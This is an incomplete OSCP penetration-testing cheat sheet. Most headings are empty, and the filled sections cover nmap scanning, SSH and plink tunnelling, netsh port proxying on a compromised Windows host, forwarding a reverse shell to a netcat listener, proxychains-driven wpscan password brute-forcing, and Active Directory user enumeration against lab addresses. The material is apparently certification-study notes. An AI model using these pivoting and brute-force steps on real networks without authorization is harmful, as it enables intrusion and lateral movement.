# OSCP Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>

## Service Enumeration <img src="https://cdn-icons-png.flaticon.com/512/6989/6989458.png" width="40" height="40" />
### Network Enumeration
````
nmap -p- --min-rate 1000 $IP
````
````
nmap -p <ports> -sV -sC -A $IP
````
````
copy me
````

## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />

## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" /> 

## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />

## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />

## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />

## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />

## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />

## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
### Tools
#### rinetd Port Fowarding
````
sudo apt update && sudo apt install rinetd
````
````
cat /etc/rinetd.conf
````
````
# forwarding rules come here
#
# you may specify allow and deny rules after a specific forwarding rule
# to apply to only that forwarding rule
#
# bindadress    bindport  
# connectaddress  connectport
````
````
# bindadress bindport  connectaddress  connectport
  0.0.0.0    80        216.58.207.142  80
````
````
sudo service rinetd restart
````
#### SSH Tunneling
Accessing Windows SMB Shares
````
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
````
````
kali@kali:~$ sudo vim /etc/samba/smb.conf 

kali@kali:~$ cat /etc/samba/smb.conf 
...
Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin

min protocol = SMB2
````
````
sudo /etc/init.d/smbd restart
````
````
smbclient -L 127.0.0.1 -U Administrator
````
Accessing Port 80 locally
````
ssh -L 80:0.0.0.0:80 student@192.168.146.52 -p 2222
````
Reverse Tunelling
````
ssh -N -R [bind_address:]port:host:hostport [username@address]
````
Reverse Tunelling from victim kali machine open port 2221 to mysql port 3306
````
ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
````
Compromised machine is making a reverse shell back to 127.0.0.1:5555 foward that to our local machine
````
ssh -N -R 5555:127.0.0.1:5555 student@192.168.129.52 -p 2222
````
````
nc -nlvp 5555
````
SSH Dynamic Port Fowarding
````
ssh -N -D 127.0.0.1:8080 student@$IP
````
````
cat /etc/proxychains.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 8080 
````
````
proxychains nmap --top-ports=20 -sT -Pn 127.0.0.1
````
non-root user
````
proxychains4 firefox http://127.0.0.1/
````
````
proxychains wpscan --url http://127.0.0.1:80/ --usernames usernames.txt --passwords /usr/share/wordlists/rockyou.txt
````
#### Windows Tunneling/Port Fowarding w/plink.exe
Check open network connections to port foward
````
netstat -anpb TCP
````
Option 1
````
plink.exe -ssh -l kali -pw ilak -R <your kali IP>:1234:127.0.0.1:3306 <your kali IP>
````
Option 2
````
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R <your kali IP>:1234:127.0.0.1:3306 <your kali IP>
````
Re-scan network
````
sudo nmap -sS -sV 127.0.0.1 -p 1234
````
#### NETSH
Compromised System Access Windows 10 machine 10.11.0.22 an additional network interface 192.168.1.110
````
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
````
````
netstat -anp TCP | find "4455"
````
(Only System User Can Run)
````
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
````
````
sudo vim /etc/samba/smb.conf
cat /etc/samba/smb.conf
````
````
Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin

min protocol = SMB2
````
````
sudo /etc/init.d/smbd restart
````
connect via smbclient and then mount shares to your local machine
````
smbclient -L 10.11.0.22 --port=4455 --user=Administrator
````
## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />

## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />

## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />

## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />

### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
#### Traditional Approach
````
net user
````
````
net user /domain
````
````
net user <user>_admin /domain
````
````
net group /domain
````
### Active Directory Credential Hunting <img src="https://cdn-icons-png.flaticon.com/512/1176/1176601.png" width="40" height="40" />

### Active Directory Lateral Movement <img src="https://cdn-icons-png.flaticon.com/512/9760/9760046.png" width="40" height="40" />
#### Service Account Attacks <img src="https://cdn-icons-png.flaticon.com/128/720/720234.png" width="40" height="40" />
#### Pass the Hash <img src="" width="40" height="40" />
#### Overpass the Hash <img src="" width="40" height="40" />
#### Pass the Ticket <img src="" width="40" height="40" />
#### Silver Ticket <img src="https://cdn-icons-png.flaticon.com/512/3702/3702979.png" width="40" height="40" />
#### Distributed Component Object Model (DCOM) <img src="" width="40" height="40" />

